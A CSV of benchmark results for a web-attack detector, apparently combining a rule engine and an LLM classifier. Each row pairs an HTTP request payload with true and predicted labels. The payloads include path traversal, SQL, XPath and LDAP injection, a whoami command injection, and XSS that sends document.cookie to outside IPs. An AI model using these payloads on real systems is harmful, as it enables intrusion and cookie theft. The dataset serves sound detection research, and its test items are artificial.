dataset_index,sample_id,true_label,true_attack_type,predicted_label,predicted_attack_type,request_route,initial_status,final_status,source,attack_type,request_id,confidence,predicted_reasoning,latency_ms,submit_latency_ms,poll_count,completed,normalized_payloads,retrieval_trace_origin,retrieved_topk_count,retrieved_topk_categories,retrieved_topk_scores,retrieved_topk_payloads,retrieved_topk_source_files,retrieved_topk_line_nos,true_attack_type_in_topk,predicted_attack_type_in_topk,label_correct,attack_type_correct,error
453,patt-ssi-0553,malicious,SSI,malicious,Path Traversal,immediate,200,200,rule_engine,Path Traversal,,1.0,,118.59143601031974,118.56042600993533,0,True,"[""/comments"",""python-requests/2.31"",""application/x-www-form-urlencoded"",""<!--#include file=\""..\\..\\web.config\"" -->"",""1553""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,True,False,
624,xml_test-48465,malicious,XPath Injection,malicious,SQLI Xpath Injection,queued,202,200,llm_batch,SQLi/XPath Injection,08ce9fcdfdbe6a764c420c8afe63b8a8a3371b6cf0ad074257d3ad321a861dc0,0.95,Payload contains both SQL injection patterns (' or 1<') and XPath injection syntax ('child::text()[position()=38]').,36222.652757991455,131.12884599831887,19,True,"[""/erfoo/aob5Rqlemokek2eng/I_5linkgX02B1HDbv/n1kgN9tKzgmRra7TNWP/l5a/tvBVS8nZ82fm4uL/7h721VZW@mAW7t3@/bb/uoat.htm"",""1 mil"",""209"",""rrang1eoaldda"",""nqnIl/"",""'>eo"",""nZtv"",""mnhse4r"",""application/postscript;q=0.1, audio/*, audio/*;q=0.9"",""big5, x-mac-ce"",""*"",""no-transform"",""243.161.103.42"",""tjrknitg0nC=p6gyrus' or  1<    t/ogt7vt/ie88tw/child::text()[position()=38]   or     'tzerdal'=   ';oe4iotpsoeuij=1018"",""Fri, 23 Nov 07 08:55:44 CET"",""\""FJ9quKMAVTx1pyuby5Q\"""",""pnbn=eum8h;vlns0aa"",""Sat, 28 Feb 09 18:15:37 UTC"",""\""MfDMQfgFdkbUUGs4v\"""",""*"",""*"",""0"",""no-cache"",""Basic ZWR4ZjpoZWlyZ2Q="",""9601-3,181022-,-02"",""http://adyCetd.st/veenrda/s7tz.txt"",""trailers,gzip;q=0.8"",""Cache-Control"",""Mozilla/2.5 (X11; U; Unix 3.6; di-Mi; rv:6.4.5) Gecko/43018127"",""5787,577,8"",""458x026"",""HTTP/9.3 116.58.52.111:9570"",""gzip"",""ntet/6.9, sds7/4.1"",""453 106.126.192.35 \""eoatO\"""",""326579"",""~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,True,False,
786,patt-command-injection-0910,malicious,Command Injection,malicious,SQLI Probe,queued,202,200,llm_batch,SQLi Probe,fd19078f05733013667aeda47848756aa7d816c0825c3abb449d056f2208b767,0.7,"Payload contains a single quote character ('), which is a common probe for SQL injection vulnerabilities.",36223.66238900577,134.2611030122498,19,True,"[""/profile"",""'"",""Mozilla/5.0"",""*/*""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,True,False,
269,patt-xpath-injection-0272,malicious,XPath Injection,malicious,XPath Injection,queued,202,200,llm_batch,XPath Injection,63074431eb331665c72b0e0dd5b64ceff89cb0e6d804bb89537768ef46a33fd0,0.9,"Payload contains XPath injection syntax ('substring(//user[userid=5]/username,2,1)=codepoints-to-string(...)') used for blind data extraction.",36224.71650899388,138.63598299212754,19,True,"[""/search"",""curl/8.0.1"",""application/x-www-form-urlencoded"",""substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)"",""1272""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,True,True,
180,xml_test-1669,benign,,malicious,RCE,queued,202,200,llm_batch,RCE,a072dcb0e8bd03611b4f52c5cedc81ffc8127459e0de85f1417e850f4e38e07c,0.85,"Payload contains multiple semicolons (';') for command chaining and references 'access_log', suggesting a remote command execution attempt.",36268.016711997916,156.44140799122397,19,True,"[""/w0eH2dTrOxmlMG5/yc/dOKda@bO/p3LsPK@@Ku9B7m/kJWV4UhttpsWt--txML/n8P_Tt/c59pnte7veeSA0E/txtwfNYE/s87HssimtA2a/locationAi8Un.html"",""rgeen9pcio"",""96Ow7kA"",""bCk"",""1"",""01275922"",""8236279"",""pesorkrnguyAir"",""mzUE"","" titlsphp"",""7366984779"",""hhozbsnsesln "",""tsI1wc-e66q-"",""access_logfosNvrnh"",""iyj]t"",""audio/*;q=0.5, video/*, text/*;q=0.3"",""x-mac-cyrillic;q=0.6"",""7s-9rsi;q=0.8, tLi4efn-s;q=0.1, h-ehvoeem;q=0.3, l2trpems-5itoarn"",""no-store"",""51.43.38.151"",""ut0u= ct<7nxas;iEtoaoteFt=fyudksaee;uiozwa=71546109;cirewi=sn?Jsso;Agh9s=yrro;obyetusanatnd=sZWExVxu8b"",""$Version=\""708\"""",""Wed, 27 Jan 10 17:15:54 UTC"",""\""eug.yMv.VmVToN2ACc\"""",""100-continue"",""pb3eit@susdyhwa7.com"",""Mon, 07 Jan 08 20:20:56 GMT"",""Wed, 25 Nov 09 17:32:37 UTC"",""*"",""\""oEwIr91cT2@a_Uk-\"""",""Fri, 24 Mar 06 01:03:08 CET"",""8"",""9.8"",""no-cache"",""sesl mseen0c=dlpAam"",""iblojg cls8epe=baessa"",""73-"",""http://t9iomast.uk/tbjnth1k/oc1uip/p9VddOn/y3n8.js"",""gzip;q=0.2,chunked;q=0.7,trailers"",""Via"",""Mozilla/5.2 (X11; U; Linux i386 9.1; nn-o3; rv:9.5.8) Gecko/18066507"",""x86"",""6991,2124,32"",""WinNT"",""color32"",""3512x868"",""FTP/9.5 www.ayeloa.tiff, din6Tb/2.9 www.ilotosle.png"",""ifSt; oifr=eEelSpft"",""edsh/1.1, 0e3eaA/2.7, 9eisMe/2.7"",""918 www.oDrh8eht.gif:495 \""6reee4ateqt1g\"" \""Tue, 13 Dec 05 16:36:28 CET\"""",""111.79.187.206"",""65212341307"",""--------------------------------------------------"",""~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,False,False,
790,patt-command-injection-0806,malicious,Command Injection,benign,,queued,202,200,llm_batch,,8759e857e99a22fbc8e26383bea24135fdf3168bf973681c00fdbaabfad5cc24,0.9,"The payload consists of standard HTTP headers and a numerical value, with no clear malicious patterns.",36277.89762700559,176.2426269997377,19,True,"[""/profile"",""Mozilla/5.0"",""application/x-www-form-urlencoded"",""1806""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,False,False,
89,xml_test-46099,malicious,Path Traversal,malicious,PATH Traversal RCE,queued,202,200,llm_batch,Path Traversal/RCE,c9d9049191bd045d36e3e94b2c38ce6bd114c1e4d2f7162f03011a9a2d7480a8,0.95,Payload contains a clear path traversal sequence ('../../../../../../../../../etc/passwd') and shell metacharacters ('|;') indicating potential command injection.,36308.57032399217,190.89658799930476,19,True,"[""/pgEesq/am20YHcQk_J51N0/UmFIe8/kSckijpA/enT/1hrgxnp5nnav6htle/e.R5svkjmSJAhXgjN3.swf"",""asevbh"",""gzip"",""/tI0rrtoa/tltsevoo/oc5n/wohr9f5Z.aspx"",""M3R1bjhsc3J4cHJzaGRDbw=="",""application/x-www-form-urlencoded"",""Mon, 08 Jan 07 12:55:46 CET"",""Wed, 19 Mar 08 13:26:42 UTC"",""application/*;q=0.2"",""macintosh;q=0.6"",""ictl0npe-noej7p;q=0.4, aenrthO-tTitm5;q=0.1"",""max-stale"",""245.20.88.13"",""ef=44;raoorsjuiesyEin=tUdol Eooorm;oobrroe82oeeth8=ysb|;Stmp4_grDYFV=aetRc8feshi;w.nL=t"",""$Version=\""0\"""",""Sun, 29 Feb 04 03:55:38 CET"",""W/\""Lp6NyFktXxgyhfAqmG0\"""",""1riwi"",""Thu, 25 May 06 13:19:06 CET"",""Fri, 23 Oct 09 10:00:17 CET"",""\""S2LD5KUML2M384N@i\"""",""\""te@y2_BZ2@wqypf\"""",""Mon, 28 Mar 05 13:21:03 UTC"",""495"",""4.9"",""no-cache"",""rtuN esiid=lctr"",""NTLM YXBzZWlhN29nMmVzbWZyaVRvaWxtZUFob3l0SW5zckNuTVRvNnhFc3R0"",""43-"",""http://eaoc.de/torenh/jlsn/tYesoa/yn4jgn0/msei.php"",""gzip;q=0.4"",""Trailer"",""Mozilla/7.2 (X11; U; Solaris 1.3; jr-mS; rv:0.8.9) Gecko/61350616"",""x86"",""013,8329,8"",""color32"",""1090x096"",""FTP/7.0 www.ag4QOTl.png, 5.5 185.111.24.26, eennh/5.7 185.15.65.49"",""gzip"",""vecj/8.8, yebd/9.0, jn0/6.9, OasdIr/4.2"",""952 www.hhNewo.css \""1l2t\"" \""Sun, 16 Oct 05 14:27:34 CET\"""",""12.245.148.199"",""4642917448355"",""~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"",""../../../../../../../../../etc/passwd""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,True,False,
315,xml_test-46349,malicious,Path Traversal,malicious,Path Traversal,queued,202,200,llm_batch,Path Traversal,d9c375a4dc18c640f4dfd800232f0c208e0a41ada0968466be463069139cfd8d,0.9,Payload contains a clear path traversal sequence ('../../../../../../../../../etc/passwd') attempting to access sensitive system files.,36312.76403499942,197.26649500080384,19,True,"[""/eyUIIaN3mtdYu-G/ylde/s7hnkxoKzvAk254jar/nEv/tFQ8afgi7NR6/jsndmsoiuexgs.asmx"",""umehs"",""../../../../../../../../../etc/passwd"",""video/mpeg"",""euc-tw;q=0.8, x-mac-ce;q=0.0"",""iaNoyGri-iiit;q=0.2, s-ies;q=0.7, pezndahl-enn;q=0.2"",""max-stale"",""51.115.37.124"",""rhbet=nl(;hr=leuisnVema ?;occ=3E;1bqdriyA=t<;httpsRnc56.Jls=lbenMrteac"",""$Version=\""19\"""",""Sat, 15 Dec 07 11:35:03 GMT"",""W/\""qp8J7XhNTc2YYdTu0pyK\"""",""100-continue"",""Sun, 23 Dec 07 07:40:03 UTC"",""\""Aw1QgKMgfJRrHaYSr0a\"""",""\""rKUAANKDBvP73oT\"""",""\""cbXFktDtc1jqYeVg\"""",""94"",""bdih3afa=e"",""Basic bHMyMzpVbDFzYWU="",""/eden.shtml"",""chunked,trailers,chunked"",""Authorization"",""igIes7mHt/5.5.1.4.3"",""StrongARM"",""648x2225"",""FTP/6.3 224.160.182.170, 1.7 www.thryd.shtml, 1.9 199.172.198.9:359"",""deflate"",""915 23.102.86.169 \""8rrnetn\"""",""67.104.67.27""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,True,True,
273,xml_test-46676,malicious,XSS,malicious,XSS,queued,202,200,llm_batch,XSS,29b312e2713b0ea56e64ab0e05be3f899f913ba44a4fff311fc0dbc5b4866434,0.95,Payload contains a clear Cross-Site Scripting (XSS) attack using an iframe with 'vbscript:' to execute code and potentially steal cookies.,36320.53719900432,196.1451870010933,19,True,"[""/tauqa5br7M/odlsih/hgntseeot0/oq5auTn/vytm.gif"",""text/xml;q=0.1"",""windows-1258;q=0.3, euc-kr;q=0.3"",""Alr-nhrretq;q=0.7, g8an3a-hc;q=0.3, el-jlS, 7n-msot"",""only-if-cached"",""122.1.27.92"",""dZd76ZT=<iframe     src =\""   vbscript:[window.open('http://203.40.129.228/tasesi.cgi'+document.cookie);]   \"" >;alnOroE=74;ieit=539"",""$Version=\""540\"""",""Tue, 02 Mar 04 21:07:01 UTC"",""W/\""9u50R3giJ00UX31EaDee\"""",""eJiOoru"",""Dped3ih@fknm2tsceo.gov"",""Sat, 01 Dec 07 06:22:28 UTC"",""Sat, 12 Jul 08 10:26:09 UTC"",""\""onME74EOba7Lt3HnFl\"""",""\""TXIXRP9PkLqQXPui4T0W\"""",""Wed, 19 Sep 07 14:16:00 CET"",""3"",""0.9"",""purs='h'"",""5taRoo rnn5=c3tA9"",""Digest qop=auth-int"",""2194-5461,312-2895"",""/ecygT/iall/sdenemhj/ss0eoenF.png"",""trailers,trailers,chunked"",""If-Modified-Since"",""octeni"",""x86"",""028,7117,32"",""Win98"",""color8"",""630x4242"",""5.3 www.leiz.htm, auL/1.0 108.151.227.226"",""gzip"",""ms8pnA/8.6, 2r5c/1.7, a6d/6.2, Hgagks/0.3, dwe/0.6"",""215 182.199.44.60 \""ndteejhnqoKy4mea\"" \""Sun, 18 Oct 09 09:17:52 UTC\"""",""249.226.25.170"",""49725305842038917"",""-----------"",""~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,True,True,
6,xml_test-41422,malicious,SQLi,malicious,SQLi,queued,202,200,llm_batch,SQLi,466e837cb86dac8ae8dc98f8a98d30795803accf8de1f722917dbb970b3aa04e,0.9,Payload contains a clear SQL injection pattern (' OR 'eu2a' LIKE 'aze%').,36308.7482109986,204.74674200522713,19,True,"[""/exRJVvR.j6/laiHS3-nrK/hmOWBtweGSopt/d-wXm7S-nYiXbQFk/rNi_S5@Mm1__q/er6Qh73mM8Ht88juYB/f4ihcnnttahl/d3teF0byzg0nni/5iolulrrohtkll/aWVVE4V2k2N/sN6dXco3eto/r730dwgetoW6includeinputR.html"",""wdfaaso,yh"",""deflate"",""http://ONhes.fr/gldtcng/25ed.asmx"",""bGVhcWV6Y29hbGRydG1rZQ=="",""application/x-www-form-urlencoded"",""Mon, 11 Sep 06 02:16:40 UTC"",""Mon, 27 Sep 04 01:35:13 GMT"",""text/html"",""*;q=0.4"",""*;q=0.2"",""max-stale"",""83.0.8.151"",""tneoetbluddecsu=13692;eua=67976;rcdattS80=t"",""$Version=\""458\"""",""Tue, 15 Jun 04 07:46:57 GMT"",""W/\""4aBq-mQ1_DiT7vYxf\"""",""tc0tlrr=dszryZw7"",""hbituu@nl5IshaU.be"",""Thu, 28 Jan 10 07:51:02 UTC"",""Thu, 11 Feb 10 04:25:01 UTC"",""*"",""\""Q_xzAcawW6rDinuyARp\"""",""Fri, 24 Feb 06 11:02:49 CET"",""4"",""2.2"",""no-cache"",""NTLM c2l0OGZsbXJxZUttemxlMG5hdGh1cG9zZmVzcnJ1ZWVlaHNoa2dueU1Oa3R0cg=="",""Digest cnonce=\""eHrzno0l\"""",""4509-,62-022408,-4198"",""/1jjbesaf/lapo8r/ngb7eT7i/lousjo/8qaYot1a.gz"",""trailers,deflate,trailers"",""Transfer-Encoding"",""Mozilla/3.3 (X11; U; Linux i386 0.0; is-bb; rv:4.6.8) Gecko/09868826"",""MIPS"",""0773,9723,16"",""Linux"",""color8"",""738x118"",""3.7 www.hiedagn.jpg, FTP/6.9 33.147.112.242"",""atams; eeonr=i4etmno"",""rht/5.4"",""149 193.52.96.248 \""8Xhauustfrrwxeheore\"""",""172.76.114.81"",""9168693821015244526"",""---------------------------------------"",""~~~~~~~~~~~~~~~~~~~~~~~~~~~"",""' OR 'eu2a'   LIKE    'aze%"",""rdelee5teoaia"",""xc5"",""4""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,True,True,
338,patt-path-traversal-1097,malicious,Path Traversal,malicious,Path Traversal,immediate,200,200,rule_engine,Path Traversal,,1.0,,210.57083600317128,210.54227100103162,0,True,"[""/api/items"",""python-requests/2.31"",""application/x-www-form-urlencoded"",""/..\\\\\\..\\\\\\..\\\\\\..\\\\\\..\\\\\\..\\\\\\boot.ini"",""2097""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,True,True,
706,xml_test-34149,benign,,malicious,RCE,queued,202,200,llm_batch,RCE,e11cdd637c1c34ee06554135fca5b0b0f178efde1f02eba8ae673ac4f26d4c3c,0.85,"Payload contains 'exec' and a partial command 'iNa cbatw' (likely 'netcat'), indicating a remote command execution attempt.",36325.36367500143,220.11134200147353,19,True,"[""/siJ0/EwsoeeyeKLekEuj/lskG8acceptjSsamff1cWI/ihu4vxTq7DzOZkU.bin"",""2yrcay"",""deflate"",""http://eoiase.it/i0ta2ts/rasd/oelm8mo/gnshihc.zip"",""NHRlU29qaGVlYWU5ZWlpeQ=="",""application/x-www-form-urlencoded"",""Tue, 23 Jun 09 11:37:44 CET"",""Sun, 20 Aug 06 23:06:14 GMT"",""video/*;q=0.3, image/gif;q=0.4, audio/*;q=0.2"",""iso-8859-2;q=0.4, iso-10646-ucs-2, us-ascii, iso-8859-5, euc-cn"",""*;q=0.7"",""min-fresh=04"",""105.40.117.107"",""he=vl9eru9rpatSpnTlF"",""$Version=\""339\"""",""Thu, 11 Oct 07 12:41:02 CET"",""\""KEI.oj4E9Hw.Jzu\"""",""100-continue"",""elh3tsco@Oytt10o9e.org"",""Tue, 22 Dec 09 18:33:59 CET"",""Sun, 18 Mar 07 09:49:30 CET"",""*"",""*"",""Thu, 30 Oct 08 08:06:29 GMT"",""521"",""9.1"",""tEnarimu='rsaiy4m'"",""Digest cnonce=\""ri3ml\"""",""Basic c09sMHJhaTphZWZlamU="",""-85"",""/XNWt/rzhAtLt/iqaatt.sh"",""chunked;q=0.8,gzip;q=0.3,trailers"",""Connection"",""Mozilla/2.3 (compatible; Konqueror/8.2; Windows NT; hmhjttns; atsnaa)"",""x86"",""654,4575,16"",""Win98"",""color32"",""995x590"",""s9Opi/3.0 28.29.83.134:585, 0.0 www.dalfIrvx.html, oiiuh/8.9 www.tzd7hr.jpeg:81"",""bsktot; htve9uo=naht"",""r9e3sj/2.9, ssde/1.5, 28o5l/1.1, cra/1.9, oir/5.1"",""306 75.33.43.3 \""apg0\"" \""Sun, 22 Jul 07 01:14:23 UTC\"""",""148.127.25.65"",""18830507621799"",""-------------------------------"",""~~~~~~~~~~~~~~~~"",""elu"",""iNa cbatw"",""p6tg"",""cRtFIW"",""x 7"",""uraeahy4rszswdug"",""oa%nexecwp- 3t"",""b5zyVieEOO"",""fcye'2rhn"",""'tconnect"",""awV1M40RQq"",""xe"",""06"",""7"",""oconnectdcuowao""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,False,False,
589,kaggle-cmdi-035,malicious,Command Injection,benign,,queued,202,200,llm_batch,,e017da8b4c8a30d21ce419e934be264c02e49659f3f23ec1f2ff842ceb747f92,0.6,"The semicolon (';') after '/admin/tools' could indicate command chaining, but without a subsequent command, it is too ambiguous to confidently flag as malicious.",36321.12896699982,222.74164800182916,19,True,"[""/admin/tools"","";"",""python-requests/2.31"",""*/*""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,False,False,
368,xml_test-46769,malicious,XSS,malicious,XSS,immediate,200,200,rule_engine,XSS,,1.0,,239.34956798620988,239.30759298673365,0,True,"[""/8uieyVtatybe7ih.htm"",""5,r5idQqbi,Qdcn"",""deflate"",""http://www.atnn0rp.de/v5hXa/sato0Nr/s6nvti.php4"",""ZnV3ZHpSZmUxdnZ1UmRjZQ=="",""application/x-www-form-urlencoded"",""Sat, 12 Dec 09 07:00:12 CET"",""Sun, 03 May 09 22:25:28 CET"",""*/*"",""gb2312, utf-8;q=0.8, ks_c_5601-1987, x-mac-cyrillic;q=0.5, iso-2022-jp"",""e-eil, vFoeod-osas, oe8Hnyef-ay;q=0.2"",""min-fresh=14658"",""202.152.82.23"",""ielSyYRCseeeal=ropt"",""$Version=\""4\"""",""Sun, 18 Apr 10 19:02:40 CET"",""\""uvWwqLBwApGZcIhP\"""",""feazi6"",""dyenT@gpt6glsG.cz"",""Thu, 22 May 08 06:18:58 UTC"",""Mon, 03 May 10 03:41:21 CET"",""*"",""*"",""Tue, 20 Oct 09 09:58:38 GMT"",""3218"",""0.8"",""no-cache"",""o1svi Elj40=bhoesO1"",""8eeq bSihE=Gspcil"",""462-"",""/lafsei.dll"",""gzip,gzip;q=0.4"",""Mozilla/4.8 (X11; U; SunOS sun4u 4.9; bt-eh; rv:9.3.8) Gecko/02762112"",""color32"",""1199x1516"",""FTP/2.3 www.Edityfik.js, Ar9s/1.7 90.180.35.219, 7.8 www.a4Ieoorn.jpg"",""p9loe; tn6hn=xuRtltbn"",""061 205.79.84.252 \""trdaeY\"" \""Tue, 09 Nov 04 20:27:34 CET\"""",""183.74.153.68"",""105971197314660"",""~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"",""yh2vW"",""7Ujnat5di ab9tt"",""<meta     http-equiv  =\"" refresh     \""  content  = \""  0;url=javascript:    [window.open('http://4.133.32.242/as.pl' document.cookie);]  \"" >""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,True,True,
119,patt-path-traversal-1030,malicious,Path Traversal,malicious,Path Traversal,immediate,200,200,rule_engine,Path Traversal,,1.0,,257.04534200485796,257.0172659907257,0,True,"[""/comments"",""python-requests/2.31"",""application/x-www-form-urlencoded"",""..\\..\\/etc/passwd"",""2030""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,True,True,
120,patt-ldap-injection-0006,malicious,LDAP Injection,malicious,AUTH Bypass LDAP Injection,queued,202,200,llm_batch,Auth Bypass/LDAP Injection,6afa940294082436a360afa664984a048eaa7622351352f66a0a54055059d028,0.9,Payload contains a pattern commonly used for authentication bypass or LDAP injection ('(administrator)(password=M*))').,36368.078744999366,257.52033399476204,19,True,"[""/comments"",""Mozilla/5.0"",""application/x-www-form-urlencoded"",""("",""administrator)(password=M*)) : OK"",""1006""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,True,False,
446,xml_test-46078,malicious,Path Traversal,malicious,PATH Traversal SQLI,queued,202,200,llm_batch,Path Traversal/SQLi,8d0c063e6df477ad1b23a3a9266ef485338f3d902931f9082ada098f51c437ca,0.95,"Payload contains a clear path traversal sequence ('../../../../var/log/access_log') and 'dropobject' in the URL path, which is a strong indicator of SQL injection.",36381.44112400187,258.5886320011923,19,True,"[""/tUN.B7-bO@Q/eensreLmnrm8T/1QZ/enohensi1jdg2jsytoa/1VW@5Jedropobject/e8erpa8aiKqUaHnzsebb/ahZd/8KwRLHZRLMi6SdD0/ippinpeF0at/lEQ@J.USW6p@pTJ/dLdAasdOaem3z.shtml"",""nrda,o6w,9au"",""identity"",""http://www.2huahnsd.cz/cert/wnsa/e3dijh/nisn.mspx"",""dGlFb00zdGlzYTFlcnNQMw=="",""application/x-www-form-urlencoded"",""Tue, 04 Jul 06 22:10:31 GMT"",""image/png"",""x-mac-cyrillic, iso-8859-9, gb2312, x-mac-hebrew"",""S4ib0b-nfbbs2ve;q=0.5"",""max-age=7308"",""L20Gh=72783795;te=srcpeor"",""$Version=\""9\"""",""Tue, 09 Jun 09 06:02:31 UTC"",""etctA7v=4nygoels"",""Tue, 25 Jul 06 08:26:26 GMT"",""Sat, 31 Dec 05 13:16:01 UTC"",""\""HYBHNWUjCqtD_5z\"""",""*"",""Mon, 07 Feb 05 15:11:10 CET"",""3"",""4.9"",""no-cache"",""NTLM TzJvU281YXN1a2Ficm55U0FhaHR0YWg1bnluYWN0dGVoaXM="",""4gdu ennsehb=Neam"",""http://www.yDeaph.org/oWemeEr/onga/efeielld/hipeoeo/eot1see.cgi"",""trailers,trailers"",""Mozilla/4.8 (X11; U; Unix 5.6; od-ay; rv:0.7.9) Gecko/67532300"",""1.3 241.105.230.25, 7.2 31.183.44.61"",""deflate"",""169.44.253.54"",""3193493640489"",""~~~~~~~~~~~~~~~~~~~~~~~~~~~~"",""39"",""984819"",""re1 TemgtN6w"",""dCz-wuf"",""76"",""525"",""dwSEoe"",""hPHKxph"",""../../../../var/log/access_log\u0000.html"",""bf2n~"",""qutjnueoq"",""09"",""cZWcB3oW"",""tdocumentre"",""on@""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,True,False,
152,sample-152,malicious,Path Traversal,malicious,Path Traversal,immediate,200,200,rule_engine,Path Traversal,,1.0,,262.42391498817597,262.39527999132406,0,True,"[""/rest/products/search"",""/..\\../..\\../..\\../..\\../..\\../..\\../boot.ini"",""commix/v4.2.dev1 (https://commixproject.com)"",""*/*"",""application/x-www-form-urlencoded""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,True,True,
161,xml_test-46759,malicious,XSS,malicious,XSS,immediate,200,200,rule_engine,XSS,,1.0,,274.53466299630236,274.5084729976952,0,True,"[""/hnDsghon9lhm6t0oppig/wQ9DDbBnZ9iiX8rW/HoeAu-jyL9/saiesqa0Ps6h7s/viZMe3R/yZkVtrfmm6SY5Q/orv/trh3lraanahJsoiaNtRg/hJbDgmXYy7l658_u/oo9ki6aw7osni/bjkuuo5_xMRN8QUnFe/iHm7DEQLa68.css"",""Luniiip"",""deflate"",""/ssxnoei/cRylSlt/tOjeit/e0Snazcd.msf"",""aWViZXRHdFRlQTNoczE4OQ=="",""application/x-www-form-urlencoded"",""Wed, 17 Sep 08 07:52:59 GMT"",""*/*"",""*"",""tnqid"",""Fri, 05 Nov 04 19:16:57 CET"",""*"",""\""0JOV5Sq0YhXw@SSpO2KI\"""",""Wed, 18 Oct 06 02:10:26 GMT"",""no-cache"",""http://w2toa1.it/uty0/minn/exi0otmn.mdb"",""trailers"",""Mozilla/5.3 (compatible; MSIE 0.7; Win98; wotmRdl)"",""color8"",""8NzLIHU@jl"",""SeoqanyhSs"",""yu"",""<div style  =\""  background-image: url(javascript:    [window.open('http://198.65.119.66/trelll.aspx' document.cookie);]);   \""   >"",""rzo8;4""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,True,True,
313,patt-command-injection-0946,malicious,Command Injection,malicious,RCE,queued,202,200,llm_batch,RCE,5ff47ca26bdc60aafcce8118b1fc16041f5fac40d5b7a856d2848f2d254dea1f,0.9,"Payload contains a clear command injection attempt ('"" whoami') to execute a system command.",36384.96721899719,275.0107729953015,19,True,"[""/login"",""python-requests/2.31"",""application/x-www-form-urlencoded"",""\"" whoami"",""1946""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,True,False,
